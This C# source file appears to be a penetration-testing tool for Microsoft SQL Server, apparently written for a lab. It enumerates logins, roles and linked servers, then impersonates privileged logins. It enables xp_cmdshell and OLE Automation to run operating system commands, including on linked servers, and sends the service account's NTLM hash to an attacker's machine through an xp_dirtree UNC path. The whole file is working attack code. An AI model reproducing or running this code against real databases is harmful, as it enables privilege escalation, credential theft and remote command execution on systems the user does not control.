using System;
using System.Data.SqlClient;

namespace MSSQL
{
    class Program
    {
        static void checkUser(SqlConnection con)
        {
            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            checkRole(con, "public");
            checkRole(con, "sysadmin");
        }

        static void checkRole(SqlConnection con, string roleName)
        {
            String queryRole = $"SELECT IS_SRVROLEMEMBER('{roleName}');";
            SqlCommand command = new SqlCommand(queryRole, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"User is a member of {roleName} role");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"User is NOT a member of {roleName} role");
                Console.ResetColor();
            }
            reader.Close();
        }
        static void query(SqlConnection con, String query)
        {
            try
            {
                SqlCommand command = new SqlCommand(query, con);
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    for (int i = 0; i < reader.FieldCount; i++)
                    {
                        Console.Write(reader[i].ToString() + "\t");
                    }
                    Console.WriteLine();
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("ERROR: " + ex.Message);
                Console.ResetColor();
            }
        }
        static void checkImpersonate(SqlConnection con)
        {
            bool hasResults = false;
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                hasResults = true;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Logins that can be impersonated: " + reader[0]);
                Console.ResetColor();
            }
            if (!hasResults)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("No logins available for impersonation.");
                Console.ResetColor();
            }
            reader.Close();
        }

        static void checkLinkedServer(SqlConnection con)
        {
            bool hasResults = false;
            String execCmd = "EXEC sp_linkedservers;";
            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                hasResults = true;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Linked SQL server: " + reader[0]);
                Console.ResetColor();
            }
            if (!hasResults)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("No Linked Server found.");
                Console.ResetColor();
            }
            reader.Close();
        }

        static void linkedQuery(SqlConnection con, String server, String query)
        {
            try
            {
                String execCmd = $"SELECT * FROM OPENQUERY(\"{server}\", '{query}');";
                SqlCommand command = new SqlCommand(execCmd, con);
                SqlDataReader reader = command.ExecuteReader();
                Console.WriteLine($"Executing {query} on {server}: ");
                while (reader.Read())
                {
                    for (int i = 0; i < reader.FieldCount; i++)
                    {
                        Console.Write(reader[i].ToString() + "\t");
                    }
                    Console.WriteLine();
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("ERROR: " + ex.Message);
                Console.ResetColor();
            }
        }
        static void impersonate(SqlConnection con, String user, String operation, String[] args)
        {
            try
            {
                String executeas = $"EXECUTE AS LOGIN = '{user}';";
                SqlCommand command = new SqlCommand(executeas, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();
                Console.WriteLine($"Impersonating as {user}: ");
                if (operation == "query")
                {
                    query(con, args[3]);
                }
                else if (operation == "xp_cmdshell")
                {
                    xp_cmdshell(con, args[3]);
                }
                else if (operation == "linked")
                {
                    linkedQuery(con, args[3], args[4]);
                }
                else if (operation == "xp_cmdshell_linked")
                {
                    xp_cmdshellLinked(con, args[3], args[4]);
                }
                else if (operation == "ole_cmd")
                {
                    oleCmd(con, args[3]);
                }
                else
                {
                    Console.WriteLine("Invalid operation specified.");
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("ERROR: " + ex.Message);
                Console.ResetColor();
            }
        }

        static void getHash(SqlConnection con, String server)
        {
            String query = $"EXEC master..xp_dirtree \"\\\\{server}\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            con.Close();
        }

        static void xp_cmdshell(SqlConnection con, String command)
        {
            try
            {
                String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                SqlCommand cmd = new SqlCommand(enable_xpcmd, con);
                SqlDataReader reader = cmd.ExecuteReader();
                reader.Close();
                String execCmd = $"EXEC xp_cmdshell '{command}';";
                cmd = new SqlCommand(execCmd, con);
                reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    for (int i = 0; i < reader.FieldCount; i++)
                    {
                        Console.Write(reader[i].ToString() + "\t");
                    }
                    Console.WriteLine();
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("ERROR: " + ex.Message);
                Console.ResetColor();
            }
        }
        static void xp_cmdshellLinked(SqlConnection con, String server, String command)
        {
            try
            {
                String enableadvoptions = $"EXEC ('sp_configure ''show advanced options'' , 1; reconfigure;') AT {server}";
                String enablexpcmdshell = $"EXEC ('sp_configure ''xp_cmdshell'' , 1; reconfigure;') AT {server}";
                String execCmd = $"EXEC ('xp_cmdshell ''{command}'';') AT {server}";

                SqlCommand cmd = new SqlCommand(enableadvoptions, con);
                SqlDataReader reader = cmd.ExecuteReader();
                reader.Close();
                cmd = new SqlCommand(enablexpcmdshell, con);
                reader = cmd.ExecuteReader();
                reader.Close();
                cmd = new SqlCommand(execCmd, con);
                reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    for (int i = 0; i < reader.FieldCount; i++)
                    {
                        Console.Write(reader[i].ToString() + "\t");
                    }
                    Console.WriteLine();
                }
                reader.Close();
                con.Close();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("ERROR: " + ex.Message);
                Console.ResetColor();
            }
        }

        static void oleCmd(SqlConnection con, String command)
        {
            try
            {
                String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                String execCmd = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{command}\"';";
                SqlCommand cmd = new SqlCommand(enable_ole, con);
                SqlDataReader reader = cmd.ExecuteReader();
                reader.Close();
                cmd = new SqlCommand(execCmd, con);
                reader = cmd.ExecuteReader();
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("ERROR: " + ex.Message);
                Console.ResetColor();
            }
        }

        static void showHelp()
        {
            Console.WriteLine("Usage: MSSQL.exe <SQLServer> <Database> <Operation> [/impersonate <user>]");
            Console.WriteLine();
            Console.WriteLine("Operations:");
            Console.WriteLine("  enum          - Perform SQL enumeration");
            Console.WriteLine("  query <query> - Execute a custom database query");
            Console.WriteLine("  gethash <kali_ip> - Obtain sql_svc hash");
            Console.WriteLine("  linked <server> <query> - Execute query on linked server");
            Console.WriteLine("  xp_cmdshell <cmd> - Execute OS command");
            Console.WriteLine("  xp_cmdshell_linked <server> <cmd> - Execute OS command on linked server");
            Console.WriteLine("  ole_cmd <cmd> - Execute OS command using OLE");
            Console.WriteLine();
            Console.WriteLine("Examples:");
            Console.WriteLine("  MSSQL.exe dc01.corp1.com master enum");
            Console.WriteLine("  MSSQL.exe dc01.corp1.com master query \"SELECT * FROM Users\" /impersonate sa");
            Console.WriteLine("  MSSQL.exe dc01.corp1.com master gethash 192.168.45.228");
            Console.WriteLine("  MSSQL.exe dc01.corp1.com master linked \"DC01\" \"SELECT SYSTEM_USER\" /impersonate sa");
            Console.WriteLine("  MSSQL.exe dc01.corp1.com master xp_cmdshell \"whoami\" /impersonate sa");
            Console.WriteLine("  MSSQL.exe dc01.corp1.com master xp_cmdshell_linked \"DC01\" \"whoami\" /impersonate sa");
            Console.WriteLine("  MSSQL.exe dc01.corp1.com master ole_cmd \"whoami\" /impersonate sa");
        }

        static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                showHelp();
                return;
            }

            String sqlServer = args[0];
            String database = args[1];
            String operation = args[2].ToLower();
            String impersonateUser = null;
            if (args.Length > 3 && args[args.Length - 2].ToLower() == "/impersonate")
            {
                impersonateUser = args[args.Length - 1];
            }

            String conString = $"Server={sqlServer}; Database={database}; Integrated Security=True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Auth success!");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Auth failed: " + ex.Message);
                Console.ResetColor();
                Environment.Exit(0);
            }

            if (impersonateUser != null)
            {
                impersonate(con, impersonateUser, operation, args);
            }
            else
            {
                if (operation == "enum")
                {
                    checkUser(con);
                    checkImpersonate(con);
                    checkLinkedServer(con);
                }
                else if (operation == "query" && args.Length == 4)
                {
                    query(con, args[3]);
                }
                else if (operation == "gethash" && args.Length == 4)
                {
                    getHash(con, args[3]);
                }
                else if (operation == "linked" && args.Length == 5)
                {
                    linkedQuery(con, args[3], args[4]);
                }
                else if (operation == "xp_cmdshell" && args.Length == 4)
                {
                    xp_cmdshell(con, args[3]);
                }
                else if (operation == "xp_cmdshell_linked" && args.Length == 5)
                {
                    xp_cmdshellLinked(con, args[3], args[4]);
                }
                else if (operation == "ole_cmd" && args.Length == 4)
                {
                    oleCmd(con, args[3]);
                }
                else
                {
                    Console.WriteLine("Invalid operation specified or incorrect arguments.");
                    showHelp();
                }
            }
            con.Close();
        }
    }
}
